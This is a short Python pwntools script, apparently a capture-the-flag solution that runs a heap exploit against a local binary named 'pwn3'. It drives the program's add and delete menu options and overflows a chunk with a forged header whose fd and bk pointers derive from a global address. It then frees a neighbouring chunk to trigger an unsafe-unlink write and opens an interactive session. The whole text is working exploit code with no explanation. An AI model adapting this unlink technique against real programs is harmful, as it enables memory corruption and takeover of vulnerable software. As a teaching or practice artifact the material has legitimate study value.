from pwn import *

def add(index,length, content):
    p.sendline('1')
    p.sendline(str(index))
    p.sendline(str(length))
    p.sendline(str(content))
    p.recv()

def delete(index):
    p.sendline('2')
    p.sendline(str(index))
    p.recv()

fake_fd = 0x6020c0 - 0x18
fake_bk = 0x6020c0 - 0x10
fake_prev_size = 0
fake_size = 0x100 + 1
fake_next_chunk_prev_size = 0x100
fake_next_size_flag = 0x110
context(log_level='debug')
p = process('pwn3')
p.recv()
add(0,10,123)
add(1,256,123)
add(2,256,123)
add(3,10,123)
gdb.attach(p)
delete(2)
delete(1)
add(0,512,p64(fake_prev_size)+p64(fake_size)+p64(fake_fd)+p64(fake_bk)+'A'*224+p64(fake_next_chunk_prev_size)+p64(fake_next_size_flag))
delete(2)    # unlink successful!!
p.interactive()
